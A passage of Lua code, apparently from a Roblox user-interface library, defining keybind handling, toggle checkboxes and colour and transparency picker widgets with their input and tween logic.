												binding = false 
												Keybind.Text = input.KeyCode.Name ~= "Unknown" and input.KeyCode.Name:upper() or input.UserInputType.Name:upper() 
												Keybind.Size = C.UDIM2(0,txt:GetTextSize(Keybind.Text, 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 5,0, 12) 
												Element.value.Key = input.KeyCode.Name ~= "Unknown" and input.KeyCode.Name or input.UserInputType.Name 
												if Element.value.Toggle then
													keybindadd(text, Element.value.Key)
												end
												if input.KeyCode.Name == "Backspace" then 
													Keybind.Text = "none" 
													Keybind.Size = C.UDIM2(0,txt:GetTextSize(Keybind.Text, 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 4,0, 12) 
													Element.value.Key = nil
													keybindremove(text, Element.value.Key)
												end 
											else 
												if Element.value.Key ~= nil then 
													if C.FIND(Element.value.Key, "Mouse") then 
														if input.UserInputType == Enum.UserInputType[Element.value.Key] then 
															if Element.value.Type == "Hold" then 
																Element.value.Active = true 
																if Element.value.Active and Element.value.Toggle then 
																	keybindhold(text) 
																else 
																	keybindremove(text, Element.value.Key) 
																end 
															elseif Element.value.Type == "Toggle" then 
																Element.value.Active = not Element.value.Active 
																if Element.value.Active and Element.value.Toggle then 
																	keybindtoggle(text) 
																else 
																	keybindremove(text, Element.value.Key) 
																end 
															end 
														end 
													else 
														if input.KeyCode == Enum.KeyCode[Element.value.Key] then 
															if Element.value.Type == "Hold" then 
																Element.value.Active = true 
																if Element.value.Active and Element.value.Toggle then 
																	keybindhold(text) 
																else 
																	keybindremove(text, Element.value.Key) 
																end 
															elseif Element.value.Type == "Toggle" then 
																Element.value.Active = not Element.value.Active 
																if Element.value.Active and Element.value.Toggle then 
																	keybindtoggle(text) 
																else 
																	keybindremove(text, Element.value.Key) 
																end 
															end 
														end 
													end 
												else 
													Element.value.Active = true 
												end 
											end 
											values[tabname][sectorname][tabtext][text] = Element.value 
											callback(Element.value) 
										end) 
										game:GetService("UserInputService").InputEnded:Connect(function(input) 
											if Element.value.Key ~= nil then 
												if C.FIND(Element.value.Key, "Mouse") then 
													if input.UserInputType == Enum.UserInputType[Element.value.Key] then 
														if Element.value.Type == "Hold" then 
															Element.value.Active = false 
															if Element.value.Active and Element.value.Toggle then 
																keybindhold(text) 
															else 
																keybindremove(text, Element.value.Key) 
															end 
														end 
													end 
												else 
													if input.KeyCode == Enum.KeyCode[Element.value.Key] then 
														if Element.value.Type == "Hold" then 
															Element.value.Active = false 
															if Element.value.Active and Element.value.Toggle then 
																keybindhold(text)
															else 
																keybindremove(text, Element.value.Key) 
															end 
														end 
													end 
												end 
											end 
											values[tabname][sectorname][tabtext][text] = Element.value 
											callback(Element.value) 
										end) 
									end 
									function Element:SetValue(value) 
										Element.value = value 
										update() 
										if Element.value.Key ~= nil and Element.value.Toggle then
											keybindadd(text, Element.value.Key)
										end
									end 
								elseif type == "Toggle" then 
									tabsize = tabsize + C.UDIM2(0,0,0,16) 
									Element.value = {Toggle = data.default and data.default.Toggle or false} 

									local Toggle = C.INST("Frame") 
									local Button = C.INST("TextButton") 
									local Color = C.INST("Frame") 
									local TextLabel = C.INST("TextLabel") 

									Toggle.Name = "Toggle" 
									Toggle.Parent = tab1 
									Toggle.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Toggle.BackgroundTransparency = 1.000 
									Toggle.Size = C.UDIM2(1, 0, 0, 15) 

									Button.Name = "Button" 
									Button.Parent = Toggle 
									Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Button.BackgroundTransparency = 1.000 
									Button.Size = C.UDIM2(1, 0, 1, 0) 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000

									Color.Name = "Color" 
									Color.Parent = Button 
									
									Color.BackgroundColor3 = getMainColor() 
									
									Color.BackgroundColor3 = C.COL3RGB(46, 46, 46)
									Color.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Color.Position = C.UDIM2(0, 15, 0.5, -5) 
									Color.Size = C.UDIM2(0, 8, 0, 8) 

									TextLabel.Parent = Button; TextLabel.Name = 'CheckerINeed' 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel.Size = C.UDIM2(0.111913361, 208, 1, 0) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = text 
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

									local function update() 
										if Element.value.Toggle then 
											tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = getMainColor()}) 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
										else 
											keybindremove(text, Element.value.Key) 
											tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
										values[tabname][sectorname][tabtext][text] = Element.value 
									end 

									Button.MouseButton1Down:Connect(function() 
										Element.value.Toggle = not Element.value.Toggle 
										update() 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(Element.value) 
									end) 
									if data.default then 
										update() 
									end 
									values[tabname][sectorname][tabtext][text] = Element.value 
									function Element:SetValue(value) 
										Element.value = value 
										values[tabname][sectorname][tabtext][text] = Element.value 
										update() 
										callback(Element.value) 
									end 
								elseif type == "ToggleColor" then 
									tabsize = tabsize + C.UDIM2(0,0,0,16) 
									Element.value = {Toggle = data.default and data.default.Toggle or false, Color = data.default and data.default.Color or C.COL3RGB(255,255,255)} 

									local Toggle = C.INST("Frame") 
									local Button = C.INST("TextButton") 
									local Color = C.INST("Frame") 
									local TextLabel = C.INST("TextLabel") 

									Toggle.Name = "Toggle" 
									Toggle.Parent = tab1 
									Toggle.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Toggle.BackgroundTransparency = 1.000 
									Toggle.Size = C.UDIM2(1, 0, 0, 15) 

									Button.Name = "Button" 
									Button.Parent = Toggle 
									Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Button.BackgroundTransparency = 1.000 
									Button.Size = C.UDIM2(1, 0, 1, 0) 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000

									Color.Name = "Color" 
									Color.Parent = Button 
									Color.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Color.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Color.Position = C.UDIM2(0, 15, 0.5, -5) 
									Color.Size = C.UDIM2(0, 8, 0, 8) 

									TextLabel.Parent = Button 
									TextLabel.Name = 'CheckerINeed'
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel.Size = C.UDIM2(0.111913361, 208, 1, 0) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = text 
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

									local function update() 
										if Element.value.Toggle then 
											tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = getMainColor()}) 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
										else 
											tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(Element.value) 
									end 









									local ColorH,ColorS,ColorV 

									local ColorP = C.INST("TextButton") 
									local Frame = C.INST("Frame") 
									local Colorpick = C.INST("ImageButton") 
									local ColorDrag = C.INST("Frame") 
									local Huepick = C.INST("ImageButton") 
									local Huedrag = C.INST("Frame") 

									ColorP.Name = "ColorP" 
									ColorP.Parent = Button 
									ColorP.AnchorPoint = C.Vec2(1, 0) 
									ColorP.BackgroundColor3 = C.COL3RGB(255, 0, 0) 
									ColorP.BorderColor3 = C.COL3RGB(18, 18, 16) 
									ColorP.Position = C.UDIM2(0, 270, 0.5, -4) 
									ColorP.Size = C.UDIM2(0, 18, 0, 8) 
									ColorP.AutoButtonColor = false 
									ColorP.Font = Enum.Font.Gotham 
									ColorP.Text = "" 
									ColorP.TextColor3 = C.COL3RGB(200, 200, 200) 
									ColorP.TextSize = 11.000

									Frame.Parent = ColorP 
									Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Frame.Position = C.UDIM2(-0.666666687, -170, 1.375, 0) 
									Frame.Size = C.UDIM2(0, 200, 0, 170) 
									Frame.Visible = false 
									Frame.ZIndex = 3 

									Colorpick.Name = "Colorpick" 
									Colorpick.Parent = Frame 
									Colorpick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Colorpick.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Colorpick.ClipsDescendants = false 
									Colorpick.Position = C.UDIM2(0, 40, 0, 10) 
									Colorpick.Size = C.UDIM2(0, 150, 0, 150) 
									Colorpick.AutoButtonColor = false 
									Colorpick.Image = "rbxassetid://4155801252" 
									Colorpick.ImageColor3 = C.COL3RGB(255, 0, 0) 
									Colorpick.ZIndex = 3 

									ColorDrag.Name = "ColorDrag" 
									ColorDrag.Parent = Colorpick 
									ColorDrag.AnchorPoint = C.Vec2(0.5, 0.5) 
									ColorDrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									ColorDrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
									ColorDrag.Size = C.UDIM2(0, 4, 0, 4) 
									ColorDrag.ZIndex = 3 

									Huepick.Name = "Huepick" 
									Huepick.Parent = Frame 
									Huepick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Huepick.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Huepick.ClipsDescendants = false 
									Huepick.Position = C.UDIM2(0, 10, 0, 10) 
									Huepick.Size = C.UDIM2(0, 20, 0, 150) 
									Huepick.AutoButtonColor = false 
									Huepick.Image = "rbxassetid://3641079629" 
									Huepick.ImageColor3 = C.COL3RGB(255, 0, 0) 
									Huepick.ImageTransparency = 1 
									Huepick.BackgroundTransparency = 0 
									Huepick.ZIndex = 3 

									local HueFrameGradient = C.INST("UIGradient") 
									HueFrameGradient.Rotation = 90 
									HueFrameGradient.Name = "HueFrameGradient" 
									HueFrameGradient.Parent = Huepick 
									HueFrameGradient.Color = ColorSequence.new { 
										ColorSequenceKeypoint.new(0.00, C.COL3RGB(255, 0, 0)), 
										ColorSequenceKeypoint.new(0.17, C.COL3RGB(255, 0, 255)), 
										ColorSequenceKeypoint.new(0.33, C.COL3RGB(0, 0, 255)), 
										ColorSequenceKeypoint.new(0.50, C.COL3RGB(0, 255, 255)), 
										ColorSequenceKeypoint.new(0.67, C.COL3RGB(0, 255, 0)), 
										ColorSequenceKeypoint.new(0.83, C.COL3RGB(255, 255, 0)), 
										ColorSequenceKeypoint.new(1.00, C.COL3RGB(255, 0, 0)) 
									}	 

									Huedrag.Name = "Huedrag" 
									Huedrag.Parent = Huepick 
									Huedrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Huedrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Huedrag.Size = C.UDIM2(1, 0, 0, 2) 
									Huedrag.ZIndex = 3 

									ColorP.MouseButton1Down:Connect(function() 
										Frame.Visible = not Frame.Visible 
									end) 
									local abc = false 
									local inCP = false 
									ColorP.MouseEnter:Connect(function() 
										abc = true 
									end) 
									ColorP.MouseLeave:Connect(function() 
										abc = false 
									end) 
									Frame.MouseEnter:Connect(function() 
										inCP = true 
									end) 
									Frame.MouseLeave:Connect(function() 
										inCP = false 
									end) 

									ColorH = (C.CLAMP(Huedrag.AbsolutePosition.Y-Huepick.AbsolutePosition.Y, 0, Huepick.AbsoluteSize.Y)/Huepick.AbsoluteSize.Y) 
									ColorS = 1-(C.CLAMP(ColorDrag.AbsolutePosition.X-Colorpick.AbsolutePosition.X, 0, Colorpick.AbsoluteSize.X)/Colorpick.AbsoluteSize.X) 
									ColorV = 1-(C.CLAMP(ColorDrag.AbsolutePosition.Y-Colorpick.AbsolutePosition.Y, 0, Colorpick.AbsoluteSize.Y)/Colorpick.AbsoluteSize.Y) 

									if data.default.Color ~= nil then 
										ColorH, ColorS, ColorV = data.default.Color:ToHSV() 

										ColorH = C.CLAMP(ColorH,0,1) 
										ColorS = C.CLAMP(ColorS,0,1) 
										ColorV = C.CLAMP(ColorV,0,1) 
										ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
										Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

										ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
										Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
									end 

									local mouse = LocalPlayer:GetMouse() 
									game:GetService("UserInputService").InputBegan:Connect(function(input) 
										if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
											if not dragging and not abc and not inCP then 
												Frame.Visible = false 
											end 
										end 
									end) 

									local function updateColor() 
										local ColorX = (C.CLAMP(mouse.X - Colorpick.AbsolutePosition.X, 0, Colorpick.AbsoluteSize.X)/Colorpick.AbsoluteSize.X) 
										local ColorY = (C.CLAMP(mouse.Y - Colorpick.AbsolutePosition.Y, 0, Colorpick.AbsoluteSize.Y)/Colorpick.AbsoluteSize.Y) 
										ColorDrag.Position = C.UDIM2(ColorX, 0, ColorY, 0) 
										ColorS = 1-ColorX 
										ColorV = 1-ColorY 
										Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
										ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
										values[tabname][sectorname][tabtext][text] = Element.value 
										Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
										callback(Element.value) 
									end 
									local function updateHue() 
										local y = C.CLAMP(mouse.Y - Huepick.AbsolutePosition.Y, 0, 148) 
										Huedrag.Position = C.UDIM2(0, 0, 0, y) 
										hue = y/148 
										ColorH = 1-hue 
										Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
										ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
										values[tabname][sectorname][tabtext][text] = Element.value 
										Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
										callback(Element.value) 
									end
									Colorpick.MouseButton1Down:Connect(function() 
										updateColor() 
										moveconnection = mouse.Move:Connect(function() 
											updateColor() 
										end) 
										releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
											if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
												updateColor() 
												moveconnection:Disconnect() 
												releaseconnection:Disconnect() 
											end 
										end) 
									end) 
									Huepick.MouseButton1Down:Connect(function() 
										updateHue() 
										moveconnection = mouse.Move:Connect(function() 
											updateHue() 
										end) 
										releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
											if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
												updateHue() 
												moveconnection:Disconnect() 
												releaseconnection:Disconnect() 
											end 
										end) 
									end) 

									Button.MouseButton1Down:Connect(function() 
										Element.value.Toggle = not Element.value.Toggle 
										update() 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(Element.value) 
									end) 
									if data.default then 
										update() 
									end 
									values[tabname][sectorname][tabtext][text] = Element.value 
									function Element:SetValue(value) 
										Element.value = value 
										local duplicate = C.COL3(value.Color.R, value.Color.G, value.Color.B) 
										ColorH, ColorS, ColorV = duplicate:ToHSV() 
										ColorH = C.CLAMP(ColorH,0,1) 
										ColorS = C.CLAMP(ColorS,0,1) 
										ColorV = C.CLAMP(ColorV,0,1) 

										ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
										Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
										ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
										update() 
										Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
									end 
								elseif type == "ToggleTrans" then 
									tabsize = tabsize + C.UDIM2(0,0,0,16) 
									Element.value = {Toggle = data.default and data.default.Toggle or false, Color = data.default and data.default.Color or C.COL3RGB(255,255,255), Transparency = data.default and data.default.Transparency or 0} 

									local Toggle = C.INST("Frame") 
									local Button = C.INST("TextButton") 
									local Color = C.INST("Frame") 
									local TextLabel = C.INST("TextLabel") 

									Toggle.Name = "Toggle" 
									Toggle.Parent = tab1 
									Toggle.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Toggle.BackgroundTransparency = 1.000 
									Toggle.Size = C.UDIM2(1, 0, 0, 15) 

									Button.Name = "Button" 
									Button.Parent = Toggle 
									Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Button.BackgroundTransparency = 1.000 
									Button.Size = C.UDIM2(1, 0, 1, 0) 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000

									Color.Name = "Color" 
									Color.Parent = Button 
									Color.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Color.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Color.Position = C.UDIM2(0, 15, 0.5, -5) 
									Color.Size = C.UDIM2(0, 8, 0, 8) 

									TextLabel.Parent = Button; TextLabel.Name = 'CheckerINeed'
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel.Size = C.UDIM2(0.111913361, 208, 1, 0) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = text 
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

									local function update() 
										if Element.value.Toggle then 
											tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = getMainColor()}) 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
										else 
											tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(Element.value) 
									end 

									local ColorH,ColorS,ColorV 

									local ColorP = C.INST("TextButton") 
									local Frame = C.INST("Frame") 
									local Colorpick = C.INST("ImageButton") 
									local ColorDrag = C.INST("Frame") 
									local Huepick = C.INST("ImageButton") 
									local Huedrag = C.INST("Frame") 

									ColorP.Name = "ColorP" 
									ColorP.Parent = Button 
									ColorP.AnchorPoint = C.Vec2(1, 0) 
									ColorP.BackgroundColor3 = C.COL3RGB(255, 0, 0) 
									ColorP.BorderColor3 = C.COL3RGB(18, 18, 16) 
									ColorP.Position = C.UDIM2(0, 270, 0.5, -4) 
									ColorP.Size = C.UDIM2(0, 18, 0, 8) 
									ColorP.AutoButtonColor = false 
									ColorP.Font = Enum.Font.Gotham 
									ColorP.Text = "" 
									ColorP.TextColor3 = C.COL3RGB(200, 200, 200) 
									ColorP.TextSize = 11.000

									Frame.Parent = ColorP 
									Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Frame.Position = C.UDIM2(-0.666666687, -170, 1.375, 0) 
									Frame.Size = C.UDIM2(0, 200, 0, 190) 
									Frame.Visible = false 
									Frame.ZIndex = 3 

									Colorpick.Name = "Colorpick" 
									Colorpick.Parent = Frame 
									Colorpick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Colorpick.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Colorpick.ClipsDescendants = false 
									Colorpick.Position = C.UDIM2(0, 40, 0, 10) 
									Colorpick.Size = C.UDIM2(0, 150, 0, 150) 
									Colorpick.AutoButtonColor = false 
									Colorpick.Image = "rbxassetid://4155801252" 
									Colorpick.ImageColor3 = C.COL3RGB(255, 0, 0) 
									Colorpick.ZIndex = 3 

									ColorDrag.Name = "ColorDrag" 
									ColorDrag.Parent = Colorpick 
									ColorDrag.AnchorPoint = C.Vec2(0.5, 0.5) 
									ColorDrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									ColorDrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
									ColorDrag.Size = C.UDIM2(0, 4, 0, 4) 
									ColorDrag.ZIndex = 3 

									Huepick.Name = "Huepick" 
									Huepick.Parent = Frame 
									Huepick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Huepick.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Huepick.ClipsDescendants = true 
									Huepick.Position = C.UDIM2(0, 10, 0, 10) 
									Huepick.Size = C.UDIM2(0, 20, 0, 150) 
									Huepick.AutoButtonColor = false 
									Huepick.Image = "rbxassetid://3641079629" 
									Huepick.ImageColor3 = C.COL3RGB(255, 0, 0) 
									Huepick.ImageTransparency = 1 
									Huepick.BackgroundTransparency = 0 
									Huepick.ZIndex = 3 

									local HueFrameGradient = C.INST("UIGradient") 
									HueFrameGradient.Rotation = 90 
									HueFrameGradient.Name = "HueFrameGradient" 
									HueFrameGradient.Parent = Huepick 
									HueFrameGradient.Color = ColorSequence.new { 
										ColorSequenceKeypoint.new(0.00, C.COL3RGB(255, 0, 0)), 
										ColorSequenceKeypoint.new(0.17, C.COL3RGB(255, 0, 255)), 
										ColorSequenceKeypoint.new(0.33, C.COL3RGB(0, 0, 255)), 
										ColorSequenceKeypoint.new(0.50, C.COL3RGB(0, 255, 255)), 
										ColorSequenceKeypoint.new(0.67, C.COL3RGB(0, 255, 0)), 
										ColorSequenceKeypoint.new(0.83, C.COL3RGB(255, 255, 0)), 
										ColorSequenceKeypoint.new(1.00, C.COL3RGB(255, 0, 0)) 
									}	 

									Huedrag.Name = "Huedrag" 
									Huedrag.Parent = Huepick 
									Huedrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Huedrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Huedrag.Size = C.UDIM2(1, 0, 0, 2) 
									Huedrag.ZIndex = 3 

									local Transpick = C.INST("ImageButton") 
									local Transcolor = C.INST("ImageLabel") 
									local Transdrag = C.INST("Frame") 

									Transpick.Name = "Transpick" 
									Transpick.Parent = Frame 
									Transpick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Transpick.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Transpick.Position = C.UDIM2(0, 10, 0, 167) 
									Transpick.Size = C.UDIM2(0, 180, 0, 15) 
									Transpick.AutoButtonColor = false 
									Transpick.Image = "rbxassetid://3887014957" 
									Transpick.ScaleType = Enum.ScaleType.Tile 
									Transpick.TileSize = C.UDIM2(0, 10, 0, 10) 
									Transpick.ZIndex = 3 

									Transcolor.Name = "Transcolor" 
									Transcolor.Parent = Transpick 
									Transcolor.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Transcolor.BackgroundTransparency = 1.000 
									Transcolor.Size = C.UDIM2(1, 0, 1, 0) 
									Transcolor.Image = "rbxassetid://3887017050" 
									Transcolor.ImageColor3 = C.COL3RGB(255, 0, 4) 
									Transcolor.ZIndex = 3 

									Transdrag.Name = "Transdrag" 
									Transdrag.Parent = Transcolor 
									Transdrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Transdrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Transdrag.Position = C.UDIM2(0, -1, 0, 0) 
									Transdrag.Size = C.UDIM2(0, 2, 1, 0) 
									Transdrag.ZIndex = 3 

									ColorP.MouseButton1Down:Connect(function() 
										Frame.Visible = not Frame.Visible 
									end) 
									local abc = false 
									local inCP = false 
									ColorP.MouseEnter:Connect(function() 
										abc = true 
									end) 
									ColorP.MouseLeave:Connect(function() 
										abc = false 
									end) 
									Frame.MouseEnter:Connect(function() 
										inCP = true 
									end) 
									Frame.MouseLeave:Connect(function() 
										inCP = false 
									end) 

									ColorH = (C.CLAMP(Huedrag.AbsolutePosition.Y-Huepick.AbsolutePosition.Y, 0, Huepick.AbsoluteSize.Y)/Huepick.AbsoluteSize.Y) 
									ColorS = 1-(C.CLAMP(ColorDrag.AbsolutePosition.X-Colorpick.AbsolutePosition.X, 0, Colorpick.AbsoluteSize.X)/Colorpick.AbsoluteSize.X) 
									ColorV = 1-(C.CLAMP(ColorDrag.AbsolutePosition.Y-Colorpick.AbsolutePosition.Y, 0, Colorpick.AbsoluteSize.Y)/Colorpick.AbsoluteSize.Y) 

									if data.default.Color ~= nil then 
										ColorH, ColorS, ColorV = data.default.Color:ToHSV() 

										ColorH = C.CLAMP(ColorH,0,1) 
										ColorS = C.CLAMP(ColorS,0,1) 
										ColorV = C.CLAMP(ColorV,0,1) 
										ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
										Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

										Transcolor.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

										ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
										Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
									end 
									if data.default.Transparency ~= nil then 
										Transdrag.Position = C.UDIM2(data.default.Transparency, -1, 0, 0) 
									end 
									local mouse = LocalPlayer:GetMouse() 
									game:GetService("UserInputService").InputBegan:Connect(function(input) 
										if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
											if not dragging and not abc and not inCP then 
												Frame.Visible = false 
											end 
										end 
									end) 

									local function updateColor() 
										local ColorX = (C.CLAMP(mouse.X - Colorpick.AbsolutePosition.X, 0, Colorpick.AbsoluteSize.X)/Colorpick.AbsoluteSize.X) 
										local ColorY = (C.CLAMP(mouse.Y - Colorpick.AbsolutePosition.Y, 0, Colorpick.AbsoluteSize.Y)/Colorpick.AbsoluteSize.Y) 
										ColorDrag.Position = C.UDIM2(ColorX, 0, ColorY, 0) 
										ColorS = 1-ColorX 
										ColorV = 1-ColorY 
										Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
										ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
										Transcolor.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
										values[tabname][sectorname][tabtext][text] = Element.value 
										Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
										callback(Element.value) 
									end 
									local function updateHue() 
										local y = C.CLAMP(mouse.Y - Huepick.AbsolutePosition.Y, 0, 148) 
										Huedrag.Position = C.UDIM2(0, 0, 0, y) 
										hue = y/148 
										ColorH = 1-hue 
										Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
										Transcolor.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
										ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
										values[tabname][sectorname][tabtext][text] = Element.value 
										Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
										callback(Element.value) 
									end 
									local function updateTrans() 
										local x = C.CLAMP(mouse.X - Transpick.AbsolutePosition.X, 0, 178) 
										Transdrag.Position = C.UDIM2(0, x, 0, 0) 
										Element.value.Transparency = (x/178) 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(Element.value) 
									end 
									Transpick.MouseButton1Down:Connect(function() 
										updateTrans() 
										moveconnection = mouse.Move:Connect(function() 
											updateTrans() 
										end) 
										releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
											if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
												updateTrans() 
												moveconnection:Disconnect() 
												releaseconnection:Disconnect() 
											end 
										end) 
									end) 
									Colorpick.MouseButton1Down:Connect(function() 
										updateColor() 
										moveconnection = mouse.Move:Connect(function() 
											updateColor() 
										end) 
										releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
											if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
												updateColor() 
												moveconnection:Disconnect() 
												releaseconnection:Disconnect() 
											end 
										end) 
									end) 
									Huepick.MouseButton1Down:Connect(function() 
										updateHue() 
										moveconnection = mouse.Move:Connect(function() 
											updateHue() 
										end) 
										releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
											if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
												updateHue() 
												moveconnection:Disconnect() 
